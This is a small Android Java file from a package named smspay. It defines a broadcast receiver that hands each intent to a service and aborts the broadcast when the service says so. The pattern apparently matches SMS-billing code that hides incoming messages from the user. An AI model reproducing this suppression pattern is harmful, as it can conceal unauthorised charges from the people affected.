package com.y7.smspay.mp.re;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.y7.smspay.mp.srv.Ms;

public class YNewsRjt extends BroadcastReceiver {
	@Override
	public void onReceive(Context context, Intent intent) {
		if (Ms.i().onReceive(intent)) {
			abortBroadcast();
		}
	}
}
